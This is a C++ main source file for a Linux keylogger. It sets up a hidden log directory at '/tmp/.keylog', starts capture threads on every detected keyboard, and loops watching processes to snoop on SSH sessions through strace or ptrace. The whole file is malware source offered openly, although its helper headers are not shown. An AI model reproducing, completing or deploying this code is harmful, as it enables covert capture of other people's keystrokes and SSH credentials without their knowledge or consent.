#include "keylogger.hpp"
#include "spookey.hhp"

namespace po = boost::program_options;

int main(int argc, char **argv) {
    const fs::path path_to_log = "/tmp/.keylog";
    int64_t sleep_time = 3;
    if(!fs::exists(path_to_log)){
        fs::create_directories(path_to_log);
        DEBUG_STDOUT("DIR is created");
    }

    options_description desc{"Options"};
    desc.add_options()
            ("help", "produce help message")
            ("kboard,k", value<std::string>()->default_value("ON"), "[ON/OFF] run logging all detected keyboards(default option)")
            ("mode,m", value<std::string>()->default_value("strace"), "[strace/ptrace] run ssh keylogger via STRACE or PRACE(ptrace in developing now) mechanism");

    po::variables_map vm;
    po::store(po::parse_command_line(argc, argv, desc), vm);
    po::notify(vm);

    if (vm.count("help")) {
       std::cout << desc << std::endl;
        return 1;
    }

    std::vector<Keyboard> keyboards = findKeyboards();
    std::vector<std::future<void>> captureTasks;
    captureTasks.reserve(keyboards.size());

    auto kboard_log_flag = vm["kboard"].as<std::string>();
    if (kboard_log_flag == "OFF") {
        DEBUG_STDOUT("Logging keyboards: OFF");
    } else if (kboard_log_flag == "ON"){
        DEBUG_STDOUT("Logging keyboards: ON");
        for (auto& kbd : keyboards)
            captureTasks.push_back(
                    std::async(std::launch::async, &Keyboard::capture, &kbd));
    }



    while(true){
        auto mode = vm["mode"].as<std::string>();
        if (mode == "strace") check_ps("strace");
        else check_ps("ptrace");
        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
    }
}